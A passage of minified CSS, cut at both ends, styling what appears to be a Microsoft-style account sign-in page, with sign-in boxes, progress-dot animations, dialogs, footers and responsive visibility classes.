!important}@-ms-viewport{width:device-width}@media (max-width:539px){.visible-xs{display:block !important}table.visible-xs{display:table}tr.visible-xs{display:table-row !important}th.visible-xs,td.visible-xs{display:table-cell !important}}@media (max-width:539px){.visible-xs-block{display:block !important}}@media (max-width:539px){.visible-xs-inline{display:inline !important}}@media (max-width:539px){.visible-xs-inline-block{display:inline-block !important}}@media (min-width:540px) and (max-width:767px){.visible-sm{display:block !important}table.visible-sm{display:table}tr.visible-sm{display:table-row !important}th.visible-sm,td.visible-sm{display:table-cell !important}}@media (min-width:540px) and (max-width:767px){.visible-sm-block{display:block !important}}@media (min-width:540px) and (max-width:767px){.visible-sm-inline{display:inline !important}}@media (min-width:540px) and (max-width:767px){.visible-sm-inline-block{display:inline-block !important}}@media (min-width:768px) and (max-width:991px){.visible-md{display:block !important}table.visible-md{display:table}tr.visible-md{display:table-row !important}th.visible-md,td.visible-md{display:table-cell !important}}@media (min-width:768px) and (max-width:991px){.visible-md-block{display:block !important}}@media (min-width:768px) and (max-width:991px){.visible-md-inline{display:inline !important}}@media (min-width:768px) and (max-width:991px){.visible-md-inline-block{display:inline-block !important}}@media (min-width:992px){.visible-lg{display:block !important}table.visible-lg{display:table}tr.visible-lg{display:table-row !important}th.visible-lg,td.visible-lg{display:table-cell !important}}@media (min-width:992px){.visible-lg-block{display:block !important}}@media (min-width:992px){.visible-lg-inline{display:inline !important}}@media (min-width:992px){.visible-lg-inline-block{display:inline-block !important}}@media (max-width:539px){.hidden-xs{display:none !important}}@media (min-width:540px) and (max-width:767px){.hidden-sm{display:none !important}}@media (min-width:768px) and (max-width:991px){.hidden-md{display:none !important}}@media (min-width:992px){.hidden-lg{display:none !important}}.visible-print{display:none !important}@media print{.visible-print{display:block !important}table.visible-print{display:table}tr.visible-print{display:table-row !important}th.visible-print,td.visible-print{display:table-cell !important}}.visible-print-block{display:none !important}@media print{.visible-print-block{display:block !important}}.visible-print-inline{display:none !important}@media print{.visible-print-inline{display:inline !important}}.visible-print-inline-block{display:none !important}@media print{.visible-print-inline-block{display:inline-block !important}}@media print{.hidden-print{display:none !important}}.visible-xs,.visible-sm,.visible-md,.visible-lg,.visible-xl{display:none !important}.visible-xs-block,.visible-xs-inline,.visible-xs-inline-block,.visible-sm-block,.visible-sm-inline,.visible-sm-inline-block,.visible-md-block,.visible-md-inline,.visible-md-inline-block,.visible-lg-block,.visible-lg-inline,.visible-lg-inline-block,.visible-xl-block,.visible-xl-inline,.visible-xl-inline-block{display:none !important}@media (min-width:1400px){.visible-xl{display:block !important}table.visible-xl{display:table}tr.visible-xl{display:table-row !important}th.visible-xl,td.visible-xl{display:table-cell !important}}@media (min-width:1400px){.visible-xl-block{display:block !important}}@media (min-width:1400px){.visible-xl-inline{display:inline !important}}@media (min-width:1400px){.visible-xl-inline-block{display:inline-block !important}}@media (min-width:1400px){.hidden-xl{display:none !important}}@font-face{font-family:"Segoe UI Webfont";font-weight:300;src:local("Segoe UI Semilight")}@font-face{font-family:"Segoe UI Webfont";font-weight:700;src:local("Segoe UI Bold")}@font-face{font-family:"Segoe UI Webfont";font-style:italic;font-weight:400;src:local("Segoe UI Italic")}@font-face{font-family:"Segoe UI Webfont";font-style:italic;font-weight:700;src:local("Segoe UI Bold Italic")}a:focus{outline-offset:0}input[type="file"]:focus,input[type="radio"]:focus,input[type="checkbox"]:focus{outline-offset:0}.container,.container-fluid{width:100%}.IE_M8 select{background-color:#fff !important}body.IE_M7.rtl{font-family:"Segoe UI","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math"}.IE_M7 ul{margin-left:0}.IE_M7 input[type="button"],.IE_M7 input[type="submit"],.IE_M7 button,.IE_M7 input[type="button"].btn,.IE_M7 input[type="submit"].btn,.IE_M7 button.btn{line-height:142%;overflow:visible}.IE_M7 div.input-group{float:left;z-index:5000}.IE_M7 div.input-group button,.IE_M7 div.input-group button.btn{overflow:hidden}.IE_M7 div.input-group label.input-group-addon{width:auto;float:left}.IE_M7 div.input-group div.input-group-btn{float:left}.text-caption{margin:.5rem 0 .5rem 0;margin:8px 0 8px 0}select{padding-top:3px;padding-bottom:3px;padding-left:6px}.section{margin-top:0}body{direction:ltr}body #maincontent,body #c_content{margin:0 auto}body #maincontent{width:90%;min-height:400px}.ltr_override,.dirltr{direction:ltr;text-align:left}label.label-margin{margin-top:0;margin-bottom:8px}label.disabled{border:0;background-color:rgba(0,0,0,0.2) !important}label.focus-border-color.input-group-addon.has-error,label.input-group-addon.has-error{border-color:#e81123}.bold{font-weight:600}.modal-header h4.UserTitle,.wrap-content{word-wrap:break-word}label.placeholder{display:none !important}.text-secondary{color:rgba(0,0,0,0.7);font-size:13px}.agreement-layout{white-space:pre-wrap;word-wrap:break-word;overflow-x:hidden}body.cb{text-align:center}body.cb #ftrLogo{margin:0}body.cb #maincontent{max-width:384px;padding-left:12px;padding-right:12px}body.cb .text-13{font-size:.8125rem}body.cb .radio,body.cb .alert-error{text-align:left}body.cb div.placeholderContainer{width:100%;position:relative}body.cb div.placeholderInnerContainer{left:0;top:0;width:100%;position:absolute;z-index:5}body.cb div.placeholder{color:#666;background-color:transparent;margin-top:6px;margin-left:9px;white-space:nowrap;text-align:left;cursor:text}body.cb div.placeholder.ltr_override{margin-left:11px;margin-right:auto;text-align:left}body.cb .modalDialogOverlay{position:fixed;top:0;left:0;width:100%;height:100%;background-color:#000;opacity:.5;-ms-filter:"progid:DXImageTransform.Microsoft.Alpha(Opacity=50)";filter:alpha(opacity=50);z-index:50000}body.cb .modalDialogContainer{position:fixed;top:60px;max-width:356px;width:83%;width:calc(90% - 28px);max-height:80%;max-height:calc(100% - 80px);margin-left:-2px;margin-right:-2px;border:1px solid #0067b8;background-color:#fff;z-index:50001;overflow:auto;overflow-x:hidden}body.cb .modalDialogPadding{padding:11px 12px 12px 12px}body.cb .msa-helpCell{margin-bottom:24px;position:relative}body.cb .msa-helpSVG{float:left;position:absolute}body.cb .msa-helpCellDiv{overflow:hidden;margin-left:44px}body.cb #learnMoreLink,body.cb #signup,body.cb #idA_MSAccLearnMore{white-space:nowrap}body.cb .modalDialogContent{width:100%;position:relative;margin:0 auto}body.cb .img-centipede{width:100%;max-width:266px;height:auto}body.cb .align-center{margin-left:auto;margin-right:auto;display:inline-block}body.cb #icdHIP table{width:100% !important}body.cb input.hip{width:100% !important;padding:4px 8px !important;margin-top:12px !important}body.cb tr#wlspispHIPErrorContainer>td{width:100% !important}body.cb .hip-erroricon{display:none !important}.no-margin-top{margin-top:0}.no-margin-bottom{margin-bottom:0}.no-padding-left-right{padding-left:0;padding-right:0}.display-block{display:block}.display-inline-block{display:inline-block;white-space:nowrap}@media (max-width:319px){body.cb #ftr{margin-top:60px}}@media (min-height:800px){body.cb #ftr{margin-top:60px}}@media (max-height:400px){body.cb .modalDialogContainer{top:0;max-height:100%}}.progress{overflow:hidden}.progress>div{position:absolute;height:5px;width:5px;background-color:#0067b8;z-index:100;border-radius:50%;opacity:0}.progress>img{position:absolute}.progress-container{width:100%;position:relative;margin-top:48px;margin-bottom:24px;outline-color:transparent}.progress-container-tile{width:100%;position:relative;top:1px}.progress-container-tile-content{width:100%;position:relative;top:15px}.progress{position:absolute;top:0;left:0;height:5px;width:100%}@keyframes pulse{from{opacity:.4}}@-o-keyframes pulse{from{opacity:.4}}@-moz-keyframes pulse{from{opacity:.4}}@-webkit-keyframes pulse{from{opacity:.4}}.animate-pulse{-webkit-animation:pulse 1s infinite alternate;-moz-animation:pulse 1s infinite alternate;-o-animation:pulse 1s infinite alternate;animation:pulse 1s infinite alternate}.row.tile:focus .progress>div,.row.tile:focus:hover .progress>div,.row.tile:active .progress>div{background-color:#fff}.progress>div{-webkit-animation:progressDot 2s infinite;-moz-animation:progressDot 2s infinite;-o-animation:progressDot 2s infinite;animation:progressDot 2s infinite}.progress>div:nth-child(1){-webkit-animation-delay:.05s;-moz-animation-delay:.05s;-o-animation-delay:.05s;animation-delay:.05s}.progress>div:nth-child(2){-webkit-animation-delay:.2s;-moz-animation-delay:.2s;-o-animation-delay:.2s;animation-delay:.2s}.progress>div:nth-child(3){-webkit-animation-delay:.35s;-moz-animation-delay:.35s;-o-animation-delay:.35s;animation-delay:.35s}.progress>div:nth-child(4){-webkit-animation-delay:.5s;-moz-animation-delay:.5s;-o-animation-delay:.5s;animation-delay:.5s}.progress>div:nth-child(5){-webkit-animation-delay:.65s;-moz-animation-delay:.65s;-o-animation-delay:.65s;animation-delay:.65s}@-webkit-keyframes progressDot{0%,20%{left:0;-webkit-animation-timing-function:ease-out;opacity:0}25%{opacity:1}35%{left:45%;-webkit-animation-timing-function:linear}65%{left:60%;-webkit-animation-timing-function:ease-in}75%{opacity:1}80%,100%{left:100%;opacity:0}}@-moz-keyframes progressDot{0%,20%{left:0;-moz-animation-timing-function:ease-out;opacity:0}25%{opacity:1}35%{left:45%;-moz-animation-timing-function:linear}65%{left:60%;-moz-animation-timing-function:ease-in}75%{opacity:1}80%,100%{left:100%;opacity:0}}@-o-keyframes progressDot{0%,20%{left:0;-o-animation-timing-function:ease-out;opacity:0}25%{opacity:1}35%{left:45%;-o-animation-timing-function:linear}65%{left:60%;-o-animation-timing-function:ease-in}75%{opacity:1}80%,100%{left:100%;opacity:0}}@keyframes progressDot{0%,20%{left:0;animation-timing-function:ease-out;opacity:0}25%{opacity:1}35%{left:45%;animation-timing-function:linear}65%{left:60%;animation-timing-function:ease-in}75%{opacity:1}80%,100%{left:100%;opacity:0}}@keyframes fadeIn{from{opacity:0}to{opacity:1}}@-o-keyframes fadeIn{from{opacity:0}to{opacity:1}}@-moz-keyframes fadeIn{from{opacity:0}to{opacity:1}}@-webkit-keyframes fadeIn{from{opacity:0}to{opacity:1}}div.links a{margin-left:16px;margin-right:16px}div.links a.first{padding-left:0}body.cb{color:#1b1b1b;text-align:left}.fadeIn{-webkit-animation:fadeIn 1s;-moz-animation:fadeIn 1s;-o-animation:fadeIn 1s;animation:fadeIn 1s}.backgroundImage,.background-image{-webkit-animation:fadeIn 1s;-moz-animation:fadeIn 1s;-o-animation:fadeIn 1s;animation:fadeIn 1s}.background-logo{max-width:256px;max-height:36px;display:block;margin-left:auto;margin-right:auto;-webkit-animation:fadeIn 1s;-moz-animation:fadeIn 1s;-o-animation:fadeIn 1s;animation:fadeIn 1s}.background-logo-holder{height:36px;margin-bottom:24px}.background,.background-image-holder{background:#f2f2f2}.background,.background>div,.background-image-holder,.background-image,.background-image-small{position:fixed;top:0;width:100%;height:100%}.vertical-split-main-container .background,.vertical-split-main-container .background>div,.vertical-split-main-container .background-image-holder,.vertical-split-main-container .background-image,.vertical-split-main-container .background-image-small{position:absolute}.background>div,.background-image,.background-image-small{background-repeat:no-repeat,no-repeat;background-position:center center,center center;background-size:cover,cover}.background-overlay{background:rgba(0,0,0,0.55);filter:progid:DXImageTransform.Microsoft.gradient(GradientType=0, startColorstr=\'#8C000000\', endColorstr=\'#8C000000\');position:absolute;top:0;width:100%;height:100%}.footer{position:absolute;left:0;bottom:0;width:100%;overflow:visible;z-index:99;clear:both;min-height:28px}.footer.has-background,.footer.has-background.background-always-visible{background-color:rgba(0,0,0,0.6);filter:progid:DXImageTransform.Microsoft.gradient(GradientType=0, startColorstr=\'#99000000\', endColorstr=\'#99000000\')}div.footerNode{margin:0;float:right}.footer-content.footer-item{color:#000;font-size:12px;line-height:28px;white-space:nowrap;display:inline-block;margin-left:8px;margin-right:8px}.footer-content.footer-item.debug-item{text-decoration:none;letter-spacing:3px;line-height:22px;vertical-align:top;font-size:16px;font-weight:600}.footer-content.footer-item.has-background,.footer-content.footer-item.debug-item.has-background,.footer-content.footer-item.has-background.background-always-visible,.footer-content.footer-item.debug-item.has-background.background-always-visible{color:#fff}.outer{display:table;position:absolute;height:100%;width:100%}.top{display:table-cell;vertical-align:top}.middle{display:table-cell;vertical-align:middle}.debug-details-banner{width:calc(100% - 40px);padding:44px;margin-bottom:28px;position:relative;margin-left:auto;margin-right:auto;color:#1b1b1b;background-color:#fff;padding:24px 44px;font-size:13px;max-width:440px;min-width:320px;-webkit-box-shadow:0 2px 6px rgba(0,0,0,0.2);-moz-box-shadow:0 2px 6px rgba(0,0,0,0.2);box-shadow:0 2px 6px rgba(0,0,0,0.2)}.debug-details-banner .table-cell:first-child{width:100%}.debug-details-banner .override-ltr{text-align:left}.debug-details-banner .debug-details-header{margin-bottom:10px}.debug-details-banner .debug-details-heading-text{font-size:15px}.debug-details-banner .debug-trace-section{margin-top:10px}.debug-details-banner .debug-details-notification{margin-left:5px;color:#107c10}.vertical-split-main-container .debug-details-banner{padding-left:14px;padding-right:14px;table-layout:auto}.inner,.sign-in-box{margin-left:auto;margin-right:auto;position:relative;max-width:440px;width:calc(100% - 40px);padding:44px;margin-bottom:28px;background-color:#fff;-webkit-box-shadow:0 2px 6px rgba(0,0,0,0.2);-moz-box-shadow:0 2px 6px rgba(0,0,0,0.2);box-shadow:0 2px 6px rgba(0,0,0,0.2);min-width:320px;min-height:338px;overflow:hidden}.inner.transparent-lightbox,.sign-in-box.transparent-lightbox{background-color:rgba(255,255,255,0.65)}.inner.has-popup,.sign-in-box.has-popup{margin-bottom:20px}a:hover{text-decoration:underline}.promoted-fed-cred-box{margin-left:auto;margin-right:auto;position:relative;max-width:440px;width:calc(100% - 40px);padding:44px;margin-bottom:28px;line-height:16px;min-width:320px;padding:0}.promoted-fed-cred-box>*{word-wrap:break-word}.promoted-fed-cred-content{background-color:#fff;-webkit-box-shadow:0 2px 6px rgba(0,0,0,0.2);-moz-box-shadow:0 2px 6px rgba(0,0,0,0.2);box-shadow:0 2px 6px rgba(0,0,0,0.2);padding-left:44px;padding-right:44px}.promoted-fed-cred-content.transparent-lightbox{background-color:rgba(255,255,255,0.65)}.promoted-fed-cred-content .row.tile .table{padding-top:8px;padding-bottom:8px}.new-session-popup-v2sso{margin-left:auto;margin-right:auto;position:relative;max-width:440px;width:calc(100% - 40px);padding:44px;margin-bottom:28px;background-color:#fff;-webkit-box-shadow:0 2px 6px rgba(0,0,0,0.2);-moz-box-shadow:0 2px 6px rgba(0,0,0,0.2);box-shadow:0 2px 6px rgba(0,0,0,0.2);line-height:16px;min-width:320px;padding-top:24px;padding-bottom:24px}.new-session-popup-v2sso.transparent-lightbox{background-color:rgba(255,255,255,0.65)}.new-session-popup-v2sso>*{word-wrap:break-word}.template-section{display:table-row}.template-section.main-section{height:100%}.template-header-container{display:table-cell;position:absolute;width:100%}.header{width:100%;height:48px;padding:12px 24px;box-shadow:0 2px 6px rgba(0,0,0,0.2)}.header-logo{max-height:24px;max-width:150px}.has-header{padding-top:48px}.template-main-container{display:table-cell}.lightbox-bottom-margin-debug{margin-bottom:28px}.vertical-split-main-container{padding-bottom:28px}.vertical-split-main-section{display:table;height:100%;width:100%}.vertical-split-main-section .boilerplate-text,.vertical-split-main-section .boilerplate-text.transparent-lightbox{background-color:transparent}.vertical-lightbox-container{width:500px}.vertical-lightbox-container .background-logo-holder{padding:0 44px;margin-top:44px}.vertical-split-content{box-shadow:none;margin-bottom:0;min-width:500px}.vertical-split-content .boilerplate-text{margin-bottom:0}.vertical-split-background-image-container{position:relative;height:100%}.wide{max-width:640px}pre{font-family:inherit}.pre-wrap-format{white-space:pre-wrap;word-wrap:break-word;overflow-x:hidden}.text-input,input[type="color"],input[type="date"],input[type="datetime"],input[type="datetime-local"],input[type="email"],input[type="month"],input[type="number"],input[type="password"],input[type="search"],input[type="tel"],input[type="text"],input[type="time"],input[type="url"],input[type="week"],textarea,select{padding:6px 10px;border-width:1px;border-color:#666;border-color:rgba(0,0,0,0.6);height:36px;outline:none;border-radius:0;-webkit-border-radius:0;background-color:transparent}.text-input-hover,input[type="color"]:hover,input[type="date"]:hover,input[type="datetime"]:hover,input[type="datetime-local"]:hover,input[type="email"]:hover,input[type="month"]:hover,input[type="number"]:hover,input[type="password"]:hover,input[type="search"]:hover,input[type="tel"]:hover,input[type="text"]:hover,input[type="time"]:hover,input[type="url"]:hover,input[type="week"]:hover,textarea:hover,select:hover{border-color:#323232;border-color:rgba(0,0,0,0.8)}.text-input-focus,input[type="color"]:focus,input[type="date"]:focus,input[type="datetime"]:focus,input[type="datetime-local"]:focus,input[type="email"]:focus,input[type="month"]:focus,input[type="number"]:focus,input[type="password"]:focus,input[type="search"]:focus,input[type="tel"]:focus,input[type="text"]:focus,input[type="time"]:focus,input[type="url"]:focus,input[type="week"]:focus,textarea:focus,select:focus{border-color:#0067b8;background-color:transparent}.text-input-has-error-focus,input[type="color"].has-error:focus,input[type="date"].has-error:focus,input[type="datetime"].has-error:focus,input[type="datetime-local"].has-error:focus,input[type="email"].has-error:focus,input[type="month"].has-error:focus,input[type="number"].has-error:focus,input[type="password"].has-error:focus,input[type="search"].has-error:focus,input[type="tel"].has-error:focus,input[type="text"].has-error:focus,input[type="time"].has-error:focus,input[type="url"].has-error:focus,input[type="week"].has-error:focus,textarea.has-error:focus,select.has-error:focus{border-color:#e81123}body.cb div.placeholder{margin-top:8px;margin-left:0}.btn,button,input[type=\'button\'],input[type=\'submit\'],input[type=\'reset\']{min-height:32px;border:none;background-color:#ccc;background-color:rgba(0,0,0,0.2);min-width:108px;line-height:normal}.btn-hover,.btn:hover,button:hover,input[type="button"]:hover,input[type="submit"]:hover,input[type="reset"]:hover{background-color:#b2b2b2;background-color:rgba(0,0,0,0.3)}.btn-focus,.btn:focus,button:focus,input[type="button"]:focus,input[type="submit"]:focus,input[type="reset"]:focus{background-color:#b2b2b2;background-color:rgba(0,0,0,0.3);text-decoration:underline;outline:2px solid #000}.btn.btn-primary,button.btn-primary,input[type="button"].btn-primary,input[type="submit"].btn-primary,input[type="reset"].btn-primary{border-color:#0067b8;background-color:#0067b8}.btn.btn-primary-hover,.btn.btn-primary:hover,button.btn-primary:hover,input[type="button"].btn-primary:hover,input[type="submit"].btn-primary:hover,input[type="reset"].btn-primary:hover{background-color:#005da6}.btn.btn-primary-focus,.btn.btn-primary:focus,button.btn-primary:focus,input[type="button"].btn-primary:focus,input[type="submit"].btn-primary:focus,input[type="reset"].btn-primary:focus{background-color:#005da6;text-decoration:underline;outline:2px solid #000}.btn-active,.btn:active,button:active,input[type="button"]:active,input[type="submit"]:active,input[type="reset"]:active,.btn.btn-primary-active,.btn.btn-primary:active,button.btn-primary:active,input[type="button"].btn-primary:active,input[type="submit"].btn-primary:active,input[type="reset"].btn-primary:active{outline:none;text-decoration:none;-ms-transform:scale(.98);-webkit-transform:scale(.98);transform:scale(.98)}.button.secondary{display:inline-block;min-width:100px;padding:4px 12px 4px 12px;margin-top:4px;margin-bottom:4px;position:relative;max-width:100%;text-align:center;white-space:nowrap;overflow:hidden;vertical-align:middle;text-overflow:ellipsis;touch-action:manipulation;color:#000;border-style:solid;border-width:2px;border-color:transparent;min-height:32px;border:none;background-color:#ccc;background-color:rgba(0,0,0,0.2);min-width:108px;line-height:normal;margin-top:0;margin-bottom:0;display:block;width:100%}.button.secondary:hover{background-color:#b2b2b2;background-color:rgba(0,0,0,0.3)}.button.secondary:focus{background-color:#b2b2b2;background-color:rgba(0,0,0,0.3);text-decoration:underline;outline:2px solid #000}.button.secondary:active{outline:none;text-decoration:none;-ms-transform:scale(.98);-webkit-transform:scale(.98);transform:scale(.98)}.button.primary{color:#fff;border-color:#0067b8;background-color:#0067b8;display:block;width:100%}.button.primary:hover{background-color:#005da6}.button.primary:focus{background-color:#005da6;text-decoration:underline;outline:2px solid #000}.button.primary:active{outline:none;text-decoration:none;-ms-transform:scale(.98);-webkit-transform:scale(.98);transform:scale(.98)}.logo{max-width:256px;height:24px}.identityBanner{height:24px;background:#fff;margin-top:16px;margin-bottom:-4px}.identity{line-height:24px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.backButton{min-height:24px;width:24px;min-width:24px;float:left;padding:0;background-color:#fff;border-width:0;border-radius:12px;margin-right:2px}.backButton:hover{background-color:#e6e6e6;background-color:rgba(0,0,0,0.1)}.backButton:hover:focus{background-color:#ccc;background-color:rgba(0,0,0,0.2)}.backButton:active{background-color:#b3b3b3;background-color:rgba(0,0,0,0.3)}.backButton:focus{background-color:#e6e6e6;background-color:rgba(0,0,0,0.1)}.boilerplate-text{background-color:#f2f2f2;padding:24px 44px 36px 44px;margin:76px -44px -44px -44px}.boilerplate-text.transparent-lightbox{background-color:rgba(242,242,242,0.2)}.boilerplate-text>p:first-child{margin-top:0}.boilerplate-text>p:last-child{margin-bottom:0}.tile-container,.relative{position:relative}.table{width:100%;display:table;table-layout:fixed}.table .table-row{display:table-row}.table .table-cell{display:table-cell;vertical-align:middle}.row{margin-left:0;margin-right:0}.row.tile{margin-bottom:0;outline:none;color:inherit;display:block;margin-left:-44px;margin-right:-44px}.row.tile:not(.no-pick){cursor:pointer}.row.tile:not(.no-pick):hover{background-color:#e6e6e6;background-color:rgba(0,0,0,0.1);color:inherit}.row.tile:not(.no-pick):active{background-color:#b3b3b3;background-color:rgba(0,0,0,0.3);color:inherit}.row.tile .content{line-height:16px;padding-left:12px;padding-right:12px}.row.tile .content>*{word-wrap:break-word}.row.tile .tile-menu{width:23px}.row.tile .table{padding:12px 44px}.row.tile .table:focus{outline:#000 dashed 1px;background:#ccc;background:rgba(0,0,0,0.1)}.row.tile .table[role=listitem]{display:table;margin-left:0}.row.tile .table-cell:first-child .table-cell{width:100%}.tile-img{position:relative;width:48px;height:48px}.tile-img.medium{width:32px;height:32px}.tile-img.small{width:24px;height:24px;float:left;margin-right:8px}.tile-img .tile-badge{position:absolute;right:0;bottom:0}h3,.text-body,p{padding:0;margin-top:16px;margin-bottom:12px}.form-group{margin-bottom:16px}.form-group label{margin-top:0;margin-bottom:0}.btn,button,input[type=\'button\'],input[type=\'submit\'],input[type=\'reset\']{margin-top:0;margin-bottom:0}.col-xs-12.secondary{padding-right:4px}.col-xs-12.primary{padding-left:4px}.no-margin{margin:0}.no-margin-bottom{margin-bottom:0}.no-margin-top-bottom{margin-top:0;margin-bottom:0}.no-padding-top-bottom{padding-top:0;padding-bottom:0}.overflow-hidden{overflow:hidden}.menu-dots{padding:24px 0;position:absolute;right:0;top:2px}.menu-dots>div{padding:0 5px}.menu-dots>div:focus{outline:#000 dashed 1px;background:none}.menu{position:absolute;background-color:#fff;border:1px solid #e6e6e6;border:1px solid rgba(0,0,0,0.1);background-clip:padding-box;z-index:2;top:0;right:10px;width:160px}.menu li{margin:0}.menu li a{display:block;padding:11px 12px 13px;background-color:#f2f2f2;background-color:rgba(0,0,0,0.05);outline:none;color:inherit;cursor:pointer}.menu li a:focus{outline:#000 dashed 1px;background-color:#e6e6e6;background-color:rgba(0,0,0,0.1)}.menu li a:hover{background-color:#e6e6e6;background-color:rgba(0,0,0,0.1)}.menu li a:active{background-color:#b3b3b3;background-color:rgba(0,0,0,0.3)}.moveOffScreen{position:fixed;bottom:0;right:0;height:0 !important;width:0 !important;overflow:hidden;opacity:0;filter:alpha(opacity=0)}.largePadding{padding:40px}.displaySign{text-align:center;font-size:2.5rem;margin-top:16px;margin-bottom:16px}.banner-logo{max-height:35px}.dialog-outer{display:table;position:absolute;height:100%;width:100%;z-index:100;background:rgba(0,0,0,0.55);filter:progid:DXImageTransform.Microsoft.gradient(GradientType=0, startColorstr=\'#8C000000\', endColorstr=\'#8C000000\')}.dialog-outer .dialog-middle{display:table-cell;vertical-align:middle}.dialog-outer .dialog-middle .dialog-inner{position:relative;margin-left:auto;margin-right:auto;padding:28px;max-width:562px;background-color:#fff;border:2px #4f74b2 solid;z-index:100}.dialog-outer .dialog-middle .dialog-inner .dialog-content{position:relative}.dialog-outer .dialog-middle .dialog-inner .dialog-content .text-title{font-size:18px;font-weight:400;padding:0;margin-top:0;margin-bottom:12px}.appInfoPopOver{position:absolute;font-size:13px;margin-left:auto;margin-right:auto;left:0;right:0;width:404px;padding:22px;border:2px solid #e6e6e6;background-color:#fff;z-index:100;-webkit-box-shadow:0 2px 6px rgba(0,0,0,0.2);-moz-box-shadow:0 2px 6px rgba(0,0,0,0.2);box-shadow:0 2px 6px rgba(0,0,0,0.2)}.appInfoPopOver .title{font-weight:600;font-weight:bold;font-size:16px}.appInfoPopOver .table{display:inline-grid;max-height:160px;max-width:95%;margin-top:8px;float:right;overflow-y:auto}.appInfoPopOver .table .row{display:table-row;padding-top:8px;word-break:break-all}.appInfoPopOver .table .label{font-weight:600;font-weight:bold}.appInfoPopOver .button{float:right;padding-right:2px;padding-left:2px}.appInfoVerifiedPublisherStatus{color:#0067b8}.no-outline{outline:none}.no-wrap{white-space:nowrap}.form-group-last-child{margin-bottom:20px}.position-buttons>div:first-child{display:inline-block;width:100%;margin-bottom:36px}ul{margin:0}.scope{margin-bottom:8px;margin-top:8px}.scope .text-caption{margin:8px 0 0 28px}.scope .toggle{cursor:pointer}.scope .toggle .chevron{width:20px;float:left}.scope .toggle .label{margin:0;margin-left:8px}.button-container{position:absolute;bottom:0;right:0;text-align:right}.agreement-buttons div.button-container{position:relative;bottom:auto;right:auto;text-align:right}.move-buttons div.button-container{bottom:auto}.help-button{cursor:pointer}@media (max-width:600px),(max-height:366px){.background,.background>div,.background-image-holder,.background-image,.background-image-small,.vertical-split-background-image-container{display:none}.background.app,.background.app>div,.background-image-holder.app,.background-image-holder.app .background-image,.background-image-holder.app .background-image-small{display:inherit}.background-logo-holder{margin-top:24px}.middle{vertical-align:top}.middle.app{padding-left:8px;padding-right:8px}.inner,.sign-in-box,.vertical-split-content{padding:24px;margin-top:0;margin-bottom:88px;width:100%;width:100vw;-webkit-box-shadow:none;-moz-box-shadow:none;box-shadow:none;border:0}.inner.app,.sign-in-box.app,.vertical-split-content.app{min-width:304px;width:calc(100vw - 16px)}.inner.app,.sign-in-box.app,.vertical-split-content.app{-webkit-box-shadow:0 2px 6px rgba(0,0,0,0.2);-moz-box-shadow:0 2px 6px rgba(0,0,0,0.2);box-shadow:0 2px 6px rgba(0,0,0,0.2);border:1px solid #818c94;border:1px solid rgba(0,0,0,0.4)}.inner.has-popup,.sign-in-box.has-popup,.vertical-split-content.has-popup{padding-bottom:0;margin-bottom:0}.inner.has-popup.app,.sign-in-box.has-popup.app,.vertical-split-content.has-popup.app{padding-bottom:24px;margin-bottom:20px}.template-header-container{z-index:2}.vertical-split-content{min-width:initial}.lightbox-bottom-margin-debug{margin-bottom:28px}.promoted-fed-cred-box{padding:24px;margin-top:0;margin-bottom:88px;width:100%;width:100vw;padding:0 24px}.promoted-fed-cred-box.app{min-width:304px;width:calc(100vw - 16px)}.promoted-fed-cred-box.app{padding:0}.promoted-fed-cred-content{-webkit-box-shadow:none;-moz-box-shadow:none;box-shadow:none;border:0;padding-left:24px;padding-right:24px;border:1px solid #818c94;border:1px solid rgba(0,0,0,0.4)}.promoted-fed-cred-content.app{-webkit-box-shadow:0 2px 6px rgba(0,0,0,0.2);-moz-box-shadow:0 2px 6px rgba(0,0,0,0.2);box-shadow:0 2px 6px rgba(0,0,0,0.2);border:1px solid #818c94;border:1px solid rgba(0,0,0,0.4)}.new-session-popup-v2sso{padding:24px;margin-top:0;margin-bottom:88px;width:100%;width:100vw}.new-session-popup-v2sso.app{min-width:304px;width:calc(100vw - 16px)}.row.tile{margin-left:-24px;margin-right:-24px}.row.tile .table{padding:12px 24px}.wide{max-width:440px}.footer,.footer.has-background{background-color:#fff;filter:none}div.footerNode{float:left;margin:0 24px !important}.footer-content.footer-item,.footer-content.footer-item.has-background,.footer-content.footer-item.debug-item.has-background{color:#747474}.boilerplate-text{padding:20px;margin-top:56px;margin-right:0;margin-bottom:0;margin-left:0}.vertical-split-main-section .boilerplate-text.transparent-lightbox{background-color:rgba(242,242,242,0.2)}.debug-details-banner,.vertical-split-main-container .debug-details-banner{background-color:#f2f2f2;padding:24px;-webkit-box-shadow:none;-moz-box-shadow:none;box-shadow:none;table-layout:auto}.appInfoPopOver{margin-left:auto;margin-right:auto;left:0;right:0;width:360px;background-color:#fff;-webkit-box-shadow:0 2px 6px rgba(0,0,0,0.2);-moz-box-shadow:0 2px 6px rgba(0,0,0,0.2);box-shadow:0 2px 6px rgba(0,0,0,0.2)}.appInfoPopOver .table{max-height:122px}.footerSignout,.footerSignout>a{color:#262626 !important}.move-buttons div.button-container{bottom:auto}}.page-description-with-icon{margin-left:34px}.bold{font-weight:bold}.stack-trace{color:black;font-family:"Consolas",monospace;overflow:auto}.stack-trace p{margin-top:15px}.stack-trace ul{list-style:none}.stack-trace ul li{margin-top:15px}.stack-trace fieldset{color:black;border:0;border-top:1px solid white;margin-bottom:50px}.stack-trace hr{border:none;border-top:solid 1px white}.linked-in-consent{position:relative}.linked-in-consent img{width:100%}.linked-in-consent .display-name{width:100%;text-align:center;bottom:10px;font-weight:600;position:absolute}.inline-block{display:inline-block}.text-input,input[type="color"],input[type="date"],input[type="datetime"],input[type="datetime-local"],input[type="email"],input[type="month"],input[type="number"],input[type="password"],input[type="search"],input[type="tel"],input[type="text"],input[type="time"],input[type="url"],input[type="week"],textarea{border-top-width:0;border-left-width:0;border-right-width:0;padding-left:0}.input.text-box{padding:4px 8px;border-style:solid;border-width:2px;border-color:rgba(0,0,0,0.4);background-color:rgba(255,255,255,0.4);height:32px;height:2rem;padding:6px 